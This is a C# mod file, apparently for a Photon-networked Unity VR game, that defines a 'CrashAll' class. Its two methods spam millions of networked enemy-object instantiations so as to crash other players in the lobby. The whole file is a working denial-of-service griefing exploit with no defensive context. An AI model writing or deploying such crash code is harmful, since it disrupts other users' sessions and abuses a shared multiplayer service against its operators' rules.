using System;

using Photon.Pun;
using UnityEngine;

namespace IIDKQuest.Mods
{
    internal class CrashAll
    {
        public static void Crash1()
        {
            int num3 = 0;
            while (num3 < 50000000)
            {
                GameObject go = PhotonNetwork.Instantiate("gorillaprefabs/gorillaenemy", Vector3.zero, Quaternion.identity, 0);
                if (go != null && go.name != "")
                {
                    UnityEngine.Object.Destroy(go);
                }
                num3++;
            }

            int num4 = 2;
            while (num4 < 999999)
            {
                GameObject go2 = PhotonNetwork.Instantiate("gorillaprefabs/gorillaenemy", Vector3.zero, Quaternion.identity, 0);
                if (go2 != null && go2.name != "")
                {
                    UnityEngine.Object.Destroy(go2);
                }
                num4++;
            }

           
        }

        public static void Crash2()
        {
            int num3 = 0;
            while (num3 < 500000000)
            {
                GameObject go = PhotonNetwork.Instantiate("gorillaprefabs/gorillaenemy", Vector3.zero, Quaternion.identity, 0);
                if (go != null && go.name != "")
                {
                    UnityEngine.Object.Destroy(go);
                }
                num3++;
            }

            int num4 = 2;
            while (num4 < 9999999)
            {
                GameObject go2 = PhotonNetwork.Instantiate("gorillaprefabs/gorillaenemy", Vector3.zero, Quaternion.identity, 0);
                if (go2 != null && go2.name != "")
                {
                    UnityEngine.Object.Destroy(go2);
                }
                num4++;
            }

            
        }
    }
}
